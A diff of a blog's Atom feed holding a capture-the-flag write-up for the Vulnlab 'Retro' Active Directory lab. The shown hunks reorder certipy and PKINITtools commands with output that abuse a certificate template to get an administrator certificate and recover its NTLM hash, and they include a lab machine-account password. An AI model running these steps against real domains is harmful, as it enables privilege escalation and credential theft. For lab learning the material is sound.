@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-12-19T21:32:52+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">archive://syl</title><author><name>Dimitar Ganev</name></author><entry><title type="html">Vulnlab - Retro [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro.html" rel="alternate" type="text/html" title="Vulnlab - Retro [Easy]" /><published>2023-12-19T00:00:00+02:00</published><updated>2023-12-19T00:00:00+02:00</updated><id>http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro.html">&lt;p&gt;Retro is an easy windows (active directory) machine by Vulnlab.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-12-19T21:34:51+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">archive://syl</title><author><name>Dimitar Ganev</name></author><entry><title type="html">Vulnlab - Retro [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro.html" rel="alternate" type="text/html" title="Vulnlab - Retro [Easy]" /><published>2023-12-19T00:00:00+02:00</published><updated>2023-12-19T00:00:00+02:00</updated><id>http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro.html">&lt;p&gt;Retro is an easy windows (active directory) machine by Vulnlab.&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;I’ve tried to show as many methods as possible to retrieve the same thing, for example retrieving the administrator’s NTLM hash and changing the password for a user with 2 different methods, I hope that you can learn more that way which is the whole point of this write-up!&lt;/p&gt;
@@ -282,11 +282,24 @@ INFO: Done in 00M 04S
 
 &lt;p&gt;Then I can query the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BANKING$&lt;/code&gt; and I can see its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;First Degree Group Membership&lt;/code&gt; that this user is part of the group &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DOMAIN COMPUTERS&lt;/code&gt;, so we can use that user to exploit the certificate and retrieve the NTLM hash of the administrator.&lt;/p&gt;
 
+&lt;p&gt;Lets retrieve the private key:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ certipy req -u &apos;BANKING$&apos; -p &apos;Summer2018!&apos; -dc-ip &apos;10.10.64.243&apos; -target &apos;dc.retro.vl&apos; -ca &apos;retro-DC-CA&apos; -template &apos;RetroClients&apos; -upn &apos;administrator&apos; -key-size 4096
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 13
+[*] Got certificate with UPN &apos;administrator&apos;
+[*] Certificate has no object SID
+[*] Saved certificate and private key to &apos;administrator.pfx&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
 &lt;h1 id=&quot;unpac-the-hash-method-1&quot;&gt;UnPAC the hash Method #1&lt;/h1&gt;
 
 &lt;p&gt;We can use the technique UnPAC the hash to get the NTLM hash using the &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/dirkjanm/PKINITtools&quot;&gt;PKINITtools&lt;/a&gt;.&lt;/p&gt;
 
-&lt;p&gt;First we need to retrieve the TGT and the AS-REP encryption key&lt;/p&gt;
+&lt;p&gt;First we need to retrieve the TGT and the AS-REP encryption key.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro/temp$ gettgtpkinit -cert-pfx ../exfiltrated/administrator.pfx -dc-ip 10.10.113.62 retro.vl/administrator ../exfiltrated/administrator.ccache 
 2023-12-19 20:53:00,328 minikerberos INFO     Loading certificate and key from file
@@ -314,17 +327,7 @@ Recovered NT Hash
 
 &lt;h1 id=&quot;using-certipy-method-2&quot;&gt;Using Certipy Method #2&lt;/h1&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ certipy req -u &apos;BANKING$&apos; -p &apos;Summer2018!&apos; -dc-ip &apos;10.10.64.243&apos; -target &apos;dc.retro.vl&apos; -ca &apos;retro-DC-CA&apos; -template &apos;RetroClients&apos; -upn &apos;administrator&apos; -key-size 4096
-Certipy v4.8.2 - by Oliver Lyak (ly4k)
-
-[*] Requesting certificate via RPC
-[*] Successfully requested certificate
-[*] Request ID is 13
-[*] Got certificate with UPN &apos;administrator&apos;
-[*] Certificate has no object SID
-[*] Saved certificate and private key to &apos;administrator.pfx&apos;
-
-syl@sylsec:~/vulnlab/Retro$ certipy auth -pfx ./exfiltrated/administrator.pfx -dc-ip &apos;10.10.64.243&apos; -username &apos;administrator&apos; -domain retro.vl
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ certipy auth -pfx ./exfiltrated/administrator.pfx -dc-ip &apos;10.10.64.243&apos; -username &apos;administrator&apos; -domain retro.vl
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Using principal: administrator@retro.vl
